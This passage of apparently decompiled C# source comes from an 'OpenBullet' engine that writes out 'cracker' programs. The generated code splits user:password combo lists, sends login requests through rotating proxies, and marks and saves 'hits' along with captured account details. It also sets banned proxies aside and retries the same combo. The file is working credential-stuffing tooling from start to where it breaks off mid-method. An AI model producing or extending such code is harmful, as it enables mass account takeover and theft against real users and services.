using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.IO;
using OpenBullet.Loaders;

namespace OpenBullet.Engine
{
    public class Core
    {
        // Token: 0x06000025 RID: 37 RVA: 0x00003474 File Offset: 0x00001674
        public static void Runner(Config Instance, string projectNamespace, object LOCKER)
        {
            Core.ProgramCS(Instance, projectNamespace, LOCKER);
            Core.ThreadingCS(Instance, projectNamespace, LOCKER);
            Core.LoadingCS(Instance, projectNamespace, LOCKER);
            Core.ProxiesCS(Instance, projectNamespace, LOCKER);
            Core.RequestCS(Instance, projectNamespace, LOCKER);
        }

        // Token: 0x06000026 RID: 38 RVA: 0x000034A0 File Offset: 0x000016A0
        public static void ProgramCS(Config Instance, string projectNamespace, object LOCKER)
        {
            string fileName = "Server\\Crackers\\" + Instance.ConfigName + "\\Classes\\Program.cs";
            Core.WriteNamespaces(projectNamespace, fileName, LOCKER);
            Core.WriteClassStructure("Program", fileName, LOCKER);
            Core.WriteVariables(fileName, LOCKER);
            Core.WriteProgramCode(Instance, fileName, LOCKER);
            Core.EndFile(fileName, LOCKER);
        }

        // Token: 0x06000027 RID: 39 RVA: 0x000034F0 File Offset: 0x000016F0
        public static void ThreadingCS(Config Instance, string projectNamespace, object LOCKER)
        {
            string fileName = "Server\\Crackers\\" + Instance.ConfigName + "\\Classes\\Threading.cs";
            Core.WriteNamespaces(projectNamespace, fileName, LOCKER);
            Core.WriteThreadingCode(fileName, LOCKER);
            Core.EndFile(fileName, LOCKER);
        }

        // Token: 0x06000028 RID: 40 RVA: 0x0000352C File Offset: 0x0000172C
        public static void LoadingCS(Config Instance, string projectNamespace, object LOCKER)
        {
            string fileName = "Server\\Crackers\\" + Instance.ConfigName + "\\Classes\\Loading.cs";
            Core.WriteNamespaces(projectNamespace, fileName, LOCKER);
            Core.WriteLoadingCode(fileName, LOCKER);
            Core.EndFile(fileName, LOCKER);
        }

        // Token: 0x06000029 RID: 41 RVA: 0x00003565 File Offset: 0x00001765
        public static void ProxiesCS(Config Instance, string projectNamespace, object LOCKER)
        {
            Core.WriteProxyClass(projectNamespace, Instance, LOCKER);
        }

        // Token: 0x0600002A RID: 42 RVA: 0x00003570 File Offset: 0x00001770
        public static void RequestCS(Config Instance, string projectNamespace, object LOCKER)
        {
            string fileName = "Server\\Crackers\\" + Instance.ConfigName + "\\Classes\\Request.cs";
            Core.WriteNamespaces(projectNamespace, fileName, LOCKER);
            Core.WriteRequestCode(fileName, Instance, LOCKER);
            Core.EndFile(fileName, LOCKER);
        }

        // Token: 0x0600002B RID: 43 RVA: 0x000035AC File Offset: 0x000017AC
        public static void WriteRequestCode(string fileName, Config Config, object LOCKER)
        {
            lock (LOCKER)
            {
                using (FileStream fileStream = new FileStream(fileName, FileMode.Append, FileAccess.Write, FileShare.None))
                {
                    using (StreamWriter streamWriter = new StreamWriter(fileStream))
                    {
                        streamWriter.WriteLine("    class Request");
                        streamWriter.WriteLine("    {");
                        streamWriter.WriteLine("        static object LOCKER = new object();");
                        streamWriter.WriteLine("        public static void MakeRequest(string Combo, Proxies proxyAddress)");
                        streamWriter.WriteLine("        {");
                        streamWriter.WriteLine("            Program.CPMTimer++;");
                        streamWriter.WriteLine("            string Username = string.Empty;");
                        streamWriter.WriteLine("            string Password = string.Empty;");
                        streamWriter.WriteLine("            ");
                        streamWriter.WriteLine("            if (Combo.Contains(\":\"))");
                        streamWriter.WriteLine("            {");
                        streamWriter.WriteLine("                  Username = Combo.Split(new string[] { \":\" }, StringSplitOptions.None)[0];");
                        streamWriter.WriteLine("                  Password = Combo.Split(new string[] { \":\" }, StringSplitOptions.None)[1];");
                        streamWriter.WriteLine("            }");
                        streamWriter.WriteLine("            else if (!Combo.Contains(\":\")) { return; }");
                        streamWriter.WriteLine("             CookieContainer cc = new CookieContainer();");
                        streamWriter.WriteLine("            try");
                        streamWriter.WriteLine("            {");
                        int num = 0;
                        int num2 = 0;
                        bool flag2 = false;
                        bool flag3 = false;
                        bool flag4 = false;
                        bool flag5 = false;
                        bool flag6 = false;
                        int num3 = 0;
                        string text = "a" + num3;
                        bool flag7 = true;
                        bool flag8 = false;
                        bool flag9 = false;
                        bool flag10 = false;
                        bool flag11 = false;
                        foreach (KeyValuePair<string, int> keyValuePair in Config.Requests)
                        {
                            if (keyValuePair.Value == 1)
                            {
                                if (keyValuePair.Key.Contains("[GET]"))
                                {
                                    string str = keyValuePair.Key.Split(new string[]
                                    {
                                        "GET] "
                                    }, StringSplitOptions.None)[1];
                                    streamWriter.WriteLine("                var client = new RestClient(\"" + str + "\");");
                                    streamWriter.WriteLine("                client.CookieContainer = cc;");
                                    streamWriter.WriteLine("                client.Proxy = new WebProxy(proxyAddress.Proxy);");
                                    streamWriter.WriteLine("                var request = new RestRequest(Method.GET);");
                                }
                                else if (keyValuePair.Key.Contains("[POST]"))
                                {
                                    string str2 = keyValuePair.Key.Split(new string[]
                                    {
                                        "POST] "
                                    }, StringSplitOptions.None)[1];
                                    streamWriter.WriteLine("                var client = new RestClient(\"" + str2 + "\");");
                                    streamWriter.WriteLine("                client.CookieContainer = cc;");
                                    streamWriter.WriteLine("                var request = new RestRequest(Method.POST);");
                                    streamWriter.WriteLine("                client.Proxy = new WebProxy(proxyAddress.Proxy);");
                                }
                                else if (keyValuePair.Key.Contains("[HEADER]"))
                                {
                                    if (!flag2)
                                    {
                                        foreach (KeyValuePair<string, int> keyValuePair2 in Config.Requests)
                                        {
                                            if (keyValuePair2.Key.Contains("DER] ") && keyValuePair2.Value == 1)
                                            {
                                                string text2 = keyValuePair2.Key.Split(new string[]
                                                {
                                                    "DER] "
                                                }, StringSplitOptions.None)[1];
                                                string text3 = text2.Split(new string[]
                                                {
                                                    ": "
                                                }, StringSplitOptions.None)[0];
                                                string text4 = text2.Split(new string[]
                                                {
                                                    ": "
                                                }, StringSplitOptions.None)[1];
                                                streamWriter.WriteLine(string.Concat(new string[]
                                                {
                                                    "            request.AddHeader(\"",
                                                    text3,
                                                    "\", \"",
                                                    text4,
                                                    "\");"
                                                }));
                                            }
                                        }
                                        flag2 = true;
                                        streamWriter.WriteLine("                IRestResponse response = client.Execute(request);");
                                        streamWriter.WriteLine("                var content = response.Content;");
                                    }
                                }
                                else if (keyValuePair.Key.Contains("[POST-DATA]"))
                                {
                                    string str3 = keyValuePair.Key.Split(new string[]
                                    {
                                        "POST-DATA] "
                                    }, StringSplitOptions.None)[1];
                                    streamWriter.WriteLine("            string postData = ReadyPostData(\"" + str3 + "\", Username, Password);");
                                    streamWriter.WriteLine("            request.AddParameter(\"text/xml\", postData, ParameterType.RequestBody);");
                                }
                                else if (keyValuePair.Key.Contains("[PARSE VARIABLE]"))
                                {
                                    string text5 = keyValuePair.Key.Split(new string[]
                                    {
                                        "RSE VARIABLE] "
                                    }, StringSplitOptions.None)[1];
                                    string text6 = text5.Split(new string[]
                                    {
                                        ": "
                                    }, StringSplitOptions.None)[0];
                                    string text7 = text5.Split(new string[]
                                    {
                                        ": "
                                    }, StringSplitOptions.None)[1];
                                    if (text6.Contains(" "))
                                    {
                                        string text8 = text6.Replace(" ", "");
                                        streamWriter.WriteLine(string.Concat(new string[]
                                        {
                                            "                string ",
                                            text8,
                                            " = Regex.Match(content, \"",
                                            text7,
                                            "\").Groups[1].ToString(); "
                                        }));
                                    }
                                    else
                                    {
                                        streamWriter.WriteLine(string.Concat(new string[]
                                        {
                                            "                string ",
                                            text6,
                                            " = Regex.Match(content, \"",
                                            text7,
                                            "\").Groups[1].ToString(); "
                                        }));
                                    }
                                    num++;
                                }
                                else if (keyValuePair.Key.Contains("[PARSE COOKIE]"))
                                {
                                    string text9 = keyValuePair.Key.Split(new string[]
                                    {
                                        "RSE COOKIE] "
                                    }, StringSplitOptions.None)[1];
                                    string str4 = text9.Split(new string[]
                                    {
                                        ": "
                                    }, StringSplitOptions.None)[0];
                                    string text10 = text9.Split(new string[]
                                    {
                                        ": "
                                    }, StringSplitOptions.None)[1];
                                    streamWriter.WriteLine("                string " + str4 + " = string.Empty;");
                                    streamWriter.WriteLine("                foreach (RestResponseCookie cookies in response.Cookies){");
                                    streamWriter.WriteLine("                " + str4 + " = cookies.Value;");
                                    streamWriter.WriteLine("                }}");
                                }
                                else if (!keyValuePair.Key.Contains("[PARSE CAPTURE]") && keyValuePair.Key.Contains("KEY] "))
                                {
                                    if (!flag3)
                                    {
                                        streamWriter.WriteLine("            string[] responseKeys = new string[] {");
                                        flag3 = true;
                                    }
                                    if (!flag4)
                                    {
                                        foreach (KeyValuePair<string, int> keyValuePair3 in Config.Requests)
                                        {
                                            if (keyValuePair3.Key.Contains("KEY] ") && keyValuePair3.Value == 1)
                                            {
                                                string str5 = keyValuePair3.Key.Split(new string[]
                                                {
                                                    " KEY] "
                                                }, StringSplitOptions.None)[1];
                                                streamWriter.WriteLine("            \"" + str5 + "\", ");
                                            }
                                        }
                                        flag4 = true;
                                    }
                                    if (flag4 && !flag5)
                                    {
                                        streamWriter.WriteLine("            };");
                                        streamWriter.WriteLine("            string _responseKey = responseKeys.FirstOrDefault<string>(s => content.Contains(s));");
                                        streamWriter.WriteLine("            ");
                                        streamWriter.WriteLine("            switch(_responseKey)");
                                        streamWriter.WriteLine("            {");
                                        flag5 = true;
                                    }
                                    if (keyValuePair.Key.Contains("SUCCESS"))
                                    {
                                        string str6 = keyValuePair.Key.Split(new string[]
                                        {
                                            " KEY] "
                                        }, StringSplitOptions.None)[1];
                                        streamWriter.WriteLine("            case \"" + str6 + "\":");
                                        streamWriter.WriteLine("              Console.ForegroundColor = ConsoleColor.Green;");
                                        streamWriter.WriteLine("              Console.WriteLine(\"[HIT]. {0}\", Combo);");
                                        streamWriter.WriteLine("              Console.ResetColor();");
                                        streamWriter.WriteLine("              Program.Hits++; Program.Checked++;");
                                        streamWriter.WriteLine("              proxyAddress.FinishedUsingProxy();");
                                        foreach (KeyValuePair<string, int> keyValuePair4 in Config.Requests)
                                        {
                                            if (keyValuePair4.Key.Contains("[PARSE CAPTURE]") && keyValuePair4.Value == 1)
                                            {
                                                string text11 = keyValuePair4.Key.Split(new string[]
                                                {
                                                    "RSE CAPTURE] "
                                                }, StringSplitOptions.None)[1];
                                                string text12 = text11.Split(new string[]
                                                {
                                                    ": "
                                                }, StringSplitOptions.None)[0];
                                                string text13 = text11.Split(new string[]
                                                {
                                                    ": "
                                                }, StringSplitOptions.None)[1];
                                                string text14 = text12.Replace(" ", "");
                                                if (text12.Contains(" "))
                                                {
                                                    num2++;
                                                    streamWriter.WriteLine(string.Concat(new object[]
                                                    {
                                                        "              string ",
                                                        text14,
                                                        num2,
                                                        " = \"",
                                                        text14,
                                                        ": \" + Regex.Match(content, \"",
                                                        text13,
                                                        "\").Groups[1].ToString(); "
                                                    }));
                                                    string str7 = text14 + num2;
                                                    if (flag7)
                                                    {
                                                        text = text + " + " + str7;
                                                    }
                                                }
                                                else
                                                {
                                                    num2++;
                                                    streamWriter.WriteLine(string.Concat(new object[]
                                                    {
                                                        "              string ",
                                                        text12,
                                                        num2,
                                                        " = \"",
                                                        text12,
                                                        ": \" +  Regex.Match(content, \"",
                                                        text13,
                                                        "\").Groups[1].ToString(); "
                                                    }));
                                                    string str8 = text14 + num2;
                                                    text = text + " + " + str8;
                                                }
                                            }
                                        }
                                        if (num2 > 0)
                                        {
                                            streamWriter.WriteLine("            string a" + num3 + " = \"Capture: \";");
                                            streamWriter.WriteLine(string.Concat(new object[]
                                            {
                                                "            string s",
                                                num3,
                                                " = ",
                                                text,
                                                ";"
                                            }));
                                            streamWriter.WriteLine("            Save(Combo, s" + num3 + ", 2);");
                                            num3++;
                                            text = "a" + num3;
                                        }
                                        else
                                        {
                                            num3++;
                                            streamWriter.WriteLine("            Save(Combo, \"\", 1);");
                                        }
                                        streamWriter.WriteLine("            ");
                                        streamWriter.WriteLine("            ");
                                        foreach (KeyValuePair<string, int> keyValuePair5 in Config.Requests)
                                        {
                                            if (keyValuePair5.Value == 2)
                                            {
                                                if (keyValuePair5.Key.Contains("[GET]"))
                                                {
                                                    string str9 = keyValuePair5.Key.Split(new string[]
                                                    {
                                                        "GET] "
                                                    }, StringSplitOptions.None)[1];
                                                    streamWriter.WriteLine("                var client2 = new RestClient(\"" + str9 + "\");");
                                                    streamWriter.WriteLine("                client2.CookieContainer = cc;");
                                                    streamWriter.WriteLine("                client2.Proxy = new WebProxy(proxyAddress.Proxy);");
                                                    streamWriter.WriteLine("                var request2 = new RestRequest(Method.GET);");
                                                    foreach (KeyValuePair<string, int> keyValuePair6 in Config.Requests)
                                                    {
                                                        if (keyValuePair6.Value == 2 && keyValuePair6.Key.Contains("DER] "))
                                                        {
                                                            if (Config.varKeys.Count<string>() > 0)
                                                            {
                                                                using (List<string>.Enumerator enumerator4 = Config.varKeys.GetEnumerator())
                                                                {
                                                                    while (enumerator4.MoveNext())
                                                                    {
                                                                        string text15 = enumerator4.Current;
                                                                        if (keyValuePair6.Key.Contains(text15))
                                                                        {
                                                                            string text16 = keyValuePair6.Key.Replace("<" + text15 + ">", "\"+" + text15 + "+\"").Split(new string[]
                                                                            {
                                                                                "DER] "
                                                                            }, StringSplitOptions.None)[1];
                                                                            string text17 = text16.Split(new string[]
                                                                            {
                                                                                ": "
                                                                            }, StringSplitOptions.None)[0];
                                                                            string text18 = text16.Split(new string[]
                                                                            {
                                                                                ": "
                                                                            }, StringSplitOptions.None)[1];
                                                                            streamWriter.WriteLine(string.Concat(new string[]
                                                                            {
                                                                                "            request.AddHeader(\"",
                                                                                text17,
                                                                                "\", \"",
                                                                                text18,
                                                                                "\");"
                                                                            }));
                                                                        }
                                                                    }
                                                                    continue;
                                                                }
                                                            }
                                                            string text19 = keyValuePair6.Key.Split(new string[]
                                                            {
                                                                "DER] "
                                                            }, StringSplitOptions.None)[1];
                                                            string text20 = text19.Split(new string[]
                                                            {
                                                                ": "
                                                            }, StringSplitOptions.None)[0];
                                                            string text21 = text19.Split(new string[]
                                                            {
                                                                ": "
                                                            }, StringSplitOptions.None)[1];
                                                            streamWriter.WriteLine(string.Concat(new string[]
                                                            {
                                                                "            request.AddHeader(\"",
                                                                text20,
                                                                "\", \"",
                                                                text21,
                                                                "\");"
                                                            }));
                                                        }
                                                    }
                                                    streamWriter.WriteLine("                IRestResponse response2 = client2.Execute(request2);");
                                                    streamWriter.WriteLine("                var content2 = response2.Content;");
                                                }
                                                else if (keyValuePair5.Key.Contains("[POST]"))
                                                {
                                                    string str10 = keyValuePair5.Key.Split(new string[]
                                                    {
                                                        "POST] "
                                                    }, StringSplitOptions.None)[1];
                                                    streamWriter.WriteLine("                var client2 = new RestClient(\"" + str10 + "\");");
                                                    streamWriter.WriteLine("                client2.CookieContainer = cc;");
                                                    streamWriter.WriteLine("                client2.Proxy = new WebProxy(proxyAddress.Proxy);");
                                                    streamWriter.WriteLine("                var request2 = new RestRequest(Method.POST);");
                                                    foreach (KeyValuePair<string, int> keyValuePair7 in Config.Requests)
                                                    {
                                                        if (keyValuePair7.Value == 2)
                                                        {
                                                            if (keyValuePair7.Key.Contains("DER] "))
                                                            {
                                                                if (Config.varKeys.Count<string>() > 0)
                                                                {
                                                                    using (List<string>.Enumerator enumerator4 = Config.varKeys.GetEnumerator())
                                                                    {
                                                                        while (enumerator4.MoveNext())
                                                                        {
                                                                            string text22 = enumerator4.Current;
                                                                            if (keyValuePair7.Key.Contains(text22))
                                                                            {
                                                                                string text23 = keyValuePair7.Key.Replace("<" + text22 + ">", "\"+" + text22 + "+\"").Split(new string[]
                                                                                {
                                                                                    "DER] "
                                                                                }, StringSplitOptions.None)[1];
                                                                                string text24 = text23.Split(new string[]
                                                                                {
                                                                                    ": "
                                                                                }, StringSplitOptions.None)[0];
                                                                                string text25 = text23.Split(new string[]
                                                                                {
                                                                                    ": "
                                                                                }, StringSplitOptions.None)[1];
                                                                                streamWriter.WriteLine(string.Concat(new string[]
                                                                                {
                                                                                    "            request.AddHeader(\"",
                                                                                    text24,
                                                                                    "\", \"",
                                                                                    text25,
                                                                                    "\");"
                                                                                }));
                                                                            }
                                                                            else
                                                                            {
                                                                                string text26 = keyValuePair7.Key.Split(new string[]
                                                                                {
                                                                                    "DER] "
                                                                                }, StringSplitOptions.None)[1];
                                                                                string text27 = text26.Split(new string[]
                                                                                {
                                                                                    ": "
                                                                                }, StringSplitOptions.None)[0];
                                                                                string text28 = text26.Split(new string[]
                                                                                {
                                                                                    ": "
                                                                                }, StringSplitOptions.None)[1];
                                                                                streamWriter.WriteLine(string.Concat(new string[]
                                                                                {
                                                                                    "            request.AddHeader(\"",
                                                                                    text27,
                                                                                    "\", \"",
                                                                                    text28,
                                                                                    "\");"
                                                                                }));
                                                                            }
                                                                        }
                                                                        continue;
                                                                    }
                                                                }
                                                                string text29 = keyValuePair7.Key.Split(new string[]
                                                                {
                                                                    "DER] "
                                                                }, StringSplitOptions.None)[1];
                                                                string text30 = text29.Split(new string[]
                                                                {
                                                                    ": "
                                                                }, StringSplitOptions.None)[0];
                                                                string text31 = text29.Split(new string[]
                                                                {
                                                                    ": "
                                                                }, StringSplitOptions.None)[1];
                                                                streamWriter.WriteLine(string.Concat(new string[]
                                                                {
                                                                    "            request.AddHeader(\"",
                                                                    text30,
                                                                    "\", \"",
                                                                    text31,
                                                                    "\");"
                                                                }));
                                                            }
                                                            else if (keyValuePair7.Key.Contains("[POST DATA]"))
                                                            {
                                                                if (Config.varKeys.Count<string>() > 0)
                                                                {
                                                                    using (List<string>.Enumerator enumerator4 = Config.varKeys.GetEnumerator())
                                                                    {
                                                                        while (enumerator4.MoveNext())
                                                                        {
                                                                            string text32 = enumerator4.Current;
                                                                            if (keyValuePair7.Key.Contains(text32))
                                                                            {
                                                                                string str11 = keyValuePair7.Key.Replace("<" + text32 + ">", "\"+" + text32 + "+\"").Split(new string[]
                                                                                {
                                                                                    "POST-DATA] "
                                                                                }, StringSplitOptions.None)[1];
                                                                                streamWriter.WriteLine("            string postData = ReadyPostData(\"" + str11 + "\", Username, Password);");
                                                                                streamWriter.WriteLine("            request.AddParameter(\"text/xml\", postData, ParameterType.RequestBody);");
                                                                            }
                                                                        }
                                                                        continue;
                                                                    }
                                                                }
                                                                string str12 = keyValuePair7.Key.Split(new string[]
                                                                {
                                                                    "POST-DATA] "
                                                                }, StringSplitOptions.None)[1];
                                                                streamWriter.WriteLine("            string postData = ReadyPostData(\"" + str12 + "\", Username, Password);");
                                                                streamWriter.WriteLine("            request.AddParameter(\"text/xml\", postData, ParameterType.RequestBody);");
                                                            }
                                                        }
                                                    }
                                                    streamWriter.WriteLine("                IRestResponse response2 = client2.Execute(request2);");
                                                    streamWriter.WriteLine("                var content2 = response2.Content;");
                                                }
                                                else
                                                {
                                                    keyValuePair5.Key.Contains("DER] ");
                                                }
                                            }
                                        }
                                        streamWriter.WriteLine("            break;");
                                        streamWriter.WriteLine("            ");
                                    }
                                    else if (keyValuePair.Key.Contains("FAILURE"))
                                    {
                                        string str13 = keyValuePair.Key.Split(new string[]
                                        {
                                            " KEY] "
                                        }, StringSplitOptions.None)[1];
                                        streamWriter.WriteLine("            case \"" + str13 + "\":");
                                        streamWriter.WriteLine("              Program.Checked++;");
                                        streamWriter.WriteLine("              Console.ForegroundColor = ConsoleColor.Red;");
                                        streamWriter.WriteLine("              Console.WriteLine(\"[Failed]. {0} WITH {1}\", Combo, proxyAddress.Proxy);");
                                        streamWriter.WriteLine("              Console.ResetColor();");
                                        streamWriter.WriteLine("              proxyAddress.FinishedUsingProxy();");
                                        streamWriter.WriteLine("            break;");
                                        streamWriter.WriteLine("            ");
                                    }
                                    else if (keyValuePair.Key.Contains("CUSTOM"))
                                    {
                                        string str14 = keyValuePair.Key.Split(new string[]
                                        {
                                            " KEY] "
                                        }, StringSplitOptions.None)[1];
                                        streamWriter.WriteLine("            case \"" + str14 + "\":");
                                        streamWriter.WriteLine("              Program.Hits++;");
                                        streamWriter.WriteLine("              Program.Checked++;");
                                        streamWriter.WriteLine("              Console.ForegroundColor = ConsoleColor.Blue;");
                                        streamWriter.WriteLine("              Console.WriteLine(\"[Custom]. {0}\", Combo);");
                                        streamWriter.WriteLine("              Console.ResetColor();");
                                        streamWriter.WriteLine("              proxyAddress.FinishedUsingProxy();");
                                        streamWriter.WriteLine("              Save(Combo, \"\", 4);");
                                        streamWriter.WriteLine("            break;");
                                        streamWriter.WriteLine("            ");
                                    }
                                    else if (keyValuePair.Key.Contains("BAN"))
                                    {
                                        string str15 = keyValuePair.Key.Split(new string[]
                                        {
                                            " KEY] "
                                        }, StringSplitOptions.None)[1];
                                        streamWriter.WriteLine("            case \"" + str15 + "\":");
                                        streamWriter.WriteLine("              Console.ForegroundColor = ConsoleColor.Yellow;");
                                        streamWriter.WriteLine("              Console.WriteLine(\"[Ban]. {0} - {1}\", Combo, proxyAddress.Proxy);");
                                        streamWriter.WriteLine("              Console.ResetColor();");
                                        streamWriter.WriteLine("              proxyAddress.BanProxyUsage();");
                                        streamWriter.WriteLine("              proxyAddress.FinishedUsingProxy();");
                                        streamWriter.WriteLine("              Program.Start(Combo);");
                                        streamWriter.WriteLine("            break;");
                                        streamWriter.WriteLine("            ");
                                    }
                                    flag6 = true;
                                }
                            }
                        }
                        if (flag6)
                        {
                            streamWriter.WriteLine("            default:");
                            streamWriter.WriteLine("              Console.WriteLine(\"Default\");");
                            streamWriter.WriteLine("              proxyAddress.BanProxyUsage();");
                            streamWriter.WriteLine("              proxyAddress.FinishedUsingProxy();");
                            streamWriter.WriteLine("              if(content.Length > 10){ Save(Combo, content, 3); }");
                            streamWriter.WriteLine("              ");
                            streamWriter.WriteLine("              Program.Start(Combo);");
                            streamWriter.WriteLine("            break;");
                            streamWriter.WriteLine("            }");
                        }
                        else
                        {
                            foreach (KeyValuePair<string, int> keyValuePair8 in Config.Requests)
                            {
                                if (keyValuePair8.Value == 2)
                                {
                                    if (keyValuePair8.Key.Contains("[GET]"))
                                    {
                                        string str16 = keyValuePair8.Key.Split(new string[]
                                        {
                                            "GET] "
                                        }, StringSplitOptions.None)[1];
                                        streamWriter.WriteLine("                var client2 = new RestClient(\"" + str16 + "\");");
                                        streamWriter.WriteLine("                client2.CookieContainer = cc;");
                                        streamWriter.WriteLine("                client2.Proxy = new WebProxy(proxyAddress.Proxy);");
                                        streamWriter.WriteLine("                var request2 = new RestRequest(Method.GET);");
                                        foreach (KeyValuePair<string, int> keyValuePair9 in Config.Requests)
                                        {
                                            if (keyValuePair9.Value == 2 && keyValuePair9.Key.Contains("DER] "))
                                            {
                                                if (Config.varKeys.Count<string>() > 0)
                                                {
                                                    using (List<string>.Enumerator enumerator4 = Config.varKeys.GetEnumerator())
                                                    {
                                                        while (enumerator4.MoveNext())
                                                        {
                                                            string text33 = enumerator4.Current;
                                                            if (keyValuePair9.Key.Contains(text33))
                                                            {
                                                                string text34 = keyValuePair9.Key.Replace("<" + text33 + ">", "\"+" + text33 + "+\"").Split(new string[]
                                                                {
                                                                    "DER] "
                                                                }, StringSplitOptions.None)[1];
                                                                string text35 = text34.Split(new string[]
                                                                {
                                                                    ": "
                                                                }, StringSplitOptions.None)[0];
                                                                string text36 = text34.Split(new string[]
                                                                {
                                                                    ": "
                                                                }, StringSplitOptions.None)[1];
                                                                streamWriter.WriteLine(string.Concat(new string[]
                                                                {
                                                                    "            request.AddHeader(\"",
                                                                    text35,
                                                                    "\", \"",
                                                                    text36,
                                                                    "\");"
                                                                }));
                                                            }
                                                            else
                                                            {
                                                                string text37 = keyValuePair9.Key.Split(new string[]
                                                                {
                                                                    "DER] "
                                                                }, StringSplitOptions.None)[1];
                                                                string text38 = text37.Split(new string[]
                                                                {
                                                                    ": "
                                                                }, StringSplitOptions.None)[0];
                                                                string text39 = text37.Split(new string[]
                                                                {
                                                                    ": "
                                                                }, StringSplitOptions.None)[1];
                                                                streamWriter.WriteLine(string.Concat(new string[]
                                                                {
                                                                    "            request.AddHeader(\"",
                                                                    text38,
                                                                    "\", \"",
                                                                    text39,
                                                                    "\");"
                                                                }));
                                                            }
                                                        }
                                                        continue;
                                                    }
                                                }
                                                string text40 = keyValuePair9.Key.Split(new string[]
                                                {
                                                    "DER] "
                                                }, StringSplitOptions.None)[1];
                                                string text41 = text40.Split(new string[]
                                                {
                                                    ": "
                                                }, StringSplitOptions.None)[0];
                                                string text42 = text40.Split(new string[]
                                                {
                                                    ": "
                                                }, StringSplitOptions.None)[1];
                                                streamWriter.WriteLine(string.Concat(new string[]
                                                {
                                                    "            request.AddHeader(\"",
                                                    text41,
                                                    "\", \"",
                                                    text42,
                                                    "\");"
                                                }));
                                            }
                                        }
                                        streamWriter.WriteLine("                IRestResponse response2 = client2.Execute(request2);");
                                        streamWriter.WriteLine("                var content2 = response2.Content;");
                                    }
                                    else if (keyValuePair8.Key.Contains("[POST]"))
                                    {
                                        string str17 = keyValuePair8.Key.Split(new string[]
                                        {
                                            "POST] "
                                        }, StringSplitOptions.None)[1];
                                        streamWriter.WriteLine("                var client2 = new RestClient(\"" + str17 + "\");");
                                        streamWriter.WriteLine("                client2.CookieContainer = cc;");
                                        streamWriter.WriteLine("                client2.Proxy = new WebProxy(proxyAddress.Proxy);");
                                        streamWriter.WriteLine("                var request2 = new RestRequest(Method.POST);");
                                        foreach (KeyValuePair<string, int> keyValuePair10 in Config.Requests)
                                        {
                                            if (keyValuePair10.Value == 2)
                                            {
                                                if (keyValuePair10.Key.Contains("DER] "))
                                                {
                                                    if (Config.varKeys.Count<string>() > 0)
                                                    {
                                                        using (List<string>.Enumerator enumerator4 = Config.varKeys.GetEnumerator())
                                                        {
                                                            while (enumerator4.MoveNext())
                                                            {
                                                                string text43 = enumerator4.Current;
                                                                if (keyValuePair10.Key.Contains(text43))
                                                                {
                                                                    string text44 = keyValuePair10.Key.Replace("<" + text43 + ">", "\"+" + text43 + "+\"").Split(new string[]
                                                                    {
                                                                        "DER] "
                                                                    }, StringSplitOptions.None)[1];
                                                                    string text45 = text44.Split(new string[]
                                                                    {
                                                                        ": "
                                                                    }, StringSplitOptions.None)[0];
                                                                    string text46 = text44.Split(new string[]
                                                                    {
                                                                        ": "
                                                                    }, StringSplitOptions.None)[1];
                                                                    streamWriter.WriteLine(string.Concat(new string[]
                                                                    {
                                                                        "            request2.AddHeader(\"",
                                                                        text45,
                                                                        "\", \"",
                                                                        text46,
                                                                        "\");"
                                                                    }));
                                                                }
                                                                else
                                                                {
                                                                    string text47 = keyValuePair10.Key.Split(new string[]
                                                                    {
                                                                        "DER] "
                                                                    }, StringSplitOptions.None)[1];
                                                                    string text48 = text47.Split(new string[]
                                                                    {
                                                                        ": "
                                                                    }, StringSplitOptions.None)[0];
                                                                    string text49 = text47.Split(new string[]
                                                                    {
                                                                        ": "
                                                                    }, StringSplitOptions.None)[1];
                                                                    streamWriter.WriteLine(string.Concat(new string[]
                                                                    {
                                                                        "            request2.AddHeader(\"",
                                                                        text48,
                                                                        "\", \"",
                                                                        text49,
                                                                        "\");"
                                                                    }));
                                                                }
                                                            }
                                                            continue;
                                                        }
                                                    }
                                                    string text50 = keyValuePair10.Key.Split(new string[]
                                                    {
                                                        "DER] "
                                                    }, StringSplitOptions.None)[1];
                                                    string text51 = text50.Split(new string[]
                                                    {
                                                        ": "
                                                    }, StringSplitOptions.None)[0];
                                                    string text52 = text50.Split(new string[]
                                                    {
                                                        ": "
                                                    }, StringSplitOptions.None)[1];
                                                    streamWriter.WriteLine(string.Concat(new string[]
                                                    {
                                                        "            request2.AddHeader(\"",
                                                        text51,
                                                        "\", \"",
                                                        text52,
                                                        "\");"
                                                    }));
                                                }
                                                else if (keyValuePair10.Key.Contains("[POST DATA]"))
                                                {
                                                    if (Config.varKeys.Count<string>() > 0)
                                                    {
                                                        using (List<string>.Enumerator enumerator4 = Config.varKeys.GetEnumerator())
                                                        {
                                                            while (enumerator4.MoveNext())
                                                            {
                                                                string text53 = enumerator4.Current;
                                                                if (keyValuePair10.Key.Contains(text53))
                                                                {
                                                                    string str18 = keyValuePair10.Key.Replace("<" + text53 + ">", "\"+" + text53 + "+\"").Split(new string[]
                                                                    {
                                                                        "POST-DATA] "
                                                                    }, StringSplitOptions.None)[1];
                                                                    streamWriter.WriteLine("            string postData = ReadyPostData(\"" + str18 + "\", Username, Password);");
                                                                    streamWriter.WriteLine("            request.AddParameter(\"text/xml\", postData, ParameterType.RequestBody);");
                                                                }
                                                            }
                                                            continue;
                                                        }
                                                    }
                                                    string str19 = keyValuePair10.Key.Split(new string[]
                                                    {
                                                        "POST-DATA] "
                                                    }, StringSplitOptions.None)[1];
                                                    streamWriter.WriteLine("            string postData = ReadyPostData(\"" + str19 + "\", Username, Password);");
                                                    streamWriter.WriteLine("            request.AddParameter(\"text/xml\", postData, ParameterType.RequestBody);");
                                                }
                                            }
                                        }
                                        streamWriter.WriteLine("                IRestResponse response2 = client2.Execute(request2);");
                                        streamWriter.WriteLine("                var content2 = response2.Content;");
                                    }
                                }
                            }
                            foreach (KeyValuePair<string, int> keyValuePair11 in Config.Requests)
                            {
                                if (keyValuePair11.Value == 2 && keyValuePair11.Key.Contains("KEY] "))
                                {
                                    if (!flag8)
                                    {
                                        streamWriter.WriteLine("            string[] responseKeys = new string[] {");
                                        flag8 = true;
                                    }
                                    if (!flag9)
                                    {
                                        foreach (KeyValuePair<string, int> keyValuePair12 in Config.Requests)
                                        {
                                            if (keyValuePair12.Key.Contains("KEY] ") && keyValuePair12.Value == 2)
                                            {
                                                string str20 = keyValuePair12.Key.Split(new string[]
                                                {
                                                    " KEY] "
                                                }, StringSplitOptions.None)[1];
                                                streamWriter.WriteLine("            \"" + str20 + "\", ");
                                            }
                                        }
                                        flag9 = true;
                                    }
                                    if (flag9 && !flag10)
                                    {
